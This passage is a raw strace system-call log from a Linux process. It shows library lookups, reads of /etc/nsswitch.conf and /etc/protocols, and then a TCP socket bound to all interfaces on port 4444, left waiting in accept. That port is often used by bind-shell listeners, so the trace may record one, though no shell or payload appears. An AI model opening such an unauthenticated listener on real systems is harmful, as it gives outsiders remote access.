9765  07:29:45.436147 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
9765  07:29:45.436201 read(6, "", 4096) = 0
9765  07:29:45.436211 close(6)          = 0
9765  07:29:45.436221 munmap(0xb7f92000, 4096) = 0
9765  07:29:45.436262 open("/etc/ld.so.cache", O_RDONLY) = 6
9765  07:29:45.436307 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9765  07:29:45.436374 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d99000
9765  07:29:45.436387 close(6)          = 0
9765  07:29:45.436397 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9765  07:29:45.436415 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436430 stat64("/lib/tls/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436444 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436457 stat64("/lib/tls/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436468 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436481 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.436498 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436510 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.436527 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436540 stat64("/lib/tls/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436551 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436563 stat64("/lib/tls/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436573 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436586 stat64("/lib/tls/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436596 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436608 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.436624 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436636 stat64("/lib/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436647 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436659 stat64("/lib/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436670 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436682 stat64("/lib/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436692 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436704 stat64("/lib/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436714 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436726 stat64("/lib/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436737 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436782 stat64("/lib/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436813 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436826 stat64("/lib/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436853 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436881 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.436897 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436910 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436926 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436939 stat64("/usr/lib/tls/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436950 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436962 stat64("/usr/lib/tls/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436974 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.436986 stat64("/usr/lib/tls/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.436997 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437009 stat64("/usr/lib/tls/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437020 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437032 stat64("/usr/lib/tls/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437043 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437055 stat64("/usr/lib/tls/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437066 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437077 stat64("/usr/lib/tls", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437088 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437101 stat64("/usr/lib/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437113 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437125 stat64("/usr/lib/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437136 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437148 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.437165 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437177 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.437194 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437206 stat64("/usr/lib/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437217 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437229 stat64("/usr/lib/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437239 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437261 stat64("/usr/lib/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437298 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437310 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
9765  07:29:45.437343 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437357 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437369 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437382 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437394 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437407 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437420 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437435 stat64("/lib/i486-linux-gnu/tls/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437447 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437460 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437472 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437485 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437496 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437509 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437521 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437533 stat64("/lib/i486-linux-gnu/tls", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437545 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437558 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437570 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437583 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437595 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437608 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437619 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437632 stat64("/lib/i486-linux-gnu/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437643 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437656 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437668 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437680 stat64("/lib/i486-linux-gnu/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437692 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437704 stat64("/lib/i486-linux-gnu/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437716 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437728 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.437776 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437810 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437824 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437871 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437883 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437896 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437909 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437922 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437934 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437950 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437962 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.437975 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.437987 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438000 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438013 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438025 stat64("/usr/lib/i486-linux-gnu/tls", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438037 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438050 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438063 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438076 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438088 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438101 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438113 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438126 stat64("/usr/lib/i486-linux-gnu/i686", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438138 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438151 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438163 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438176 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438188 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438200 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbffa343c) = -1 ENOENT (No such file or directory)
9765  07:29:45.438212 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9765  07:29:45.438225 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9765  07:29:45.438375 munmap(0xb7d99000, 29913) = 0
9765  07:29:45.438414 open("/etc/ld.so.cache", O_RDONLY) = 6
9765  07:29:45.438427 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9765  07:29:45.438443 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d99000
9765  07:29:45.438454 close(6)          = 0
9765  07:29:45.438465 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9765  07:29:45.438480 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
9765  07:29:45.438495 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9765  07:29:45.438587 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
9765  07:29:45.438608 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d8e000
9765  07:29:45.438621 mmap2(0xb7d97000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d97000
9765  07:29:45.438638 close(6)          = 0
9765  07:29:45.438661 munmap(0xb7d99000, 29913) = 0
9765  07:29:45.438677 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
9765  07:29:45.438693 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9765  07:29:45.438708 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
9765  07:29:45.438725 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da0000
9765  07:29:45.438736 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
9765  07:29:45.438986 close(6)          = 0
9765  07:29:45.438997 munmap(0xb7da0000, 4096) = 0
9765  07:29:45.439015 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
9765  07:29:45.439032 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
9765  07:29:45.439048 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da0000
9765  07:29:45.439059 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
9765  07:29:45.439231 close(6)          = 0
9765  07:29:45.439240 munmap(0xb7da0000, 4096) = 0
9765  07:29:45.439267 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
9765  07:29:45.439288 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3948) = -1 EINVAL (Invalid argument)
9765  07:29:45.439301 _llseek(6, 0, 0xbffa3990, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.439313 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3948) = -1 EINVAL (Invalid argument)
9765  07:29:45.439336 _llseek(6, 0, 0xbffa3990, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.439373 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
9765  07:29:45.439442 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
9765  07:29:45.439492 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
9765  07:29:45.439517 listen(6, 5)      = 0
9765  07:29:45.439567 accept(6,  <unfinished ...>
9764  07:29:45.448735 exit_group(0)     = ?
9762  07:29:45.448756 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 9764
9762  07:29:45.448774 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.448868 --- SIGCHLD (Child exited) @ 0 (0) ---
9762  07:29:45.448898 waitpid(-1, 0xbfe03178, WNOHANG) = -1 ECHILD (No child processes)
9762  07:29:45.448932 sigreturn()       = ? (mask now [])
9762  07:29:45.448950 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
9762  07:29:45.448997 exit_group(0)     = ?
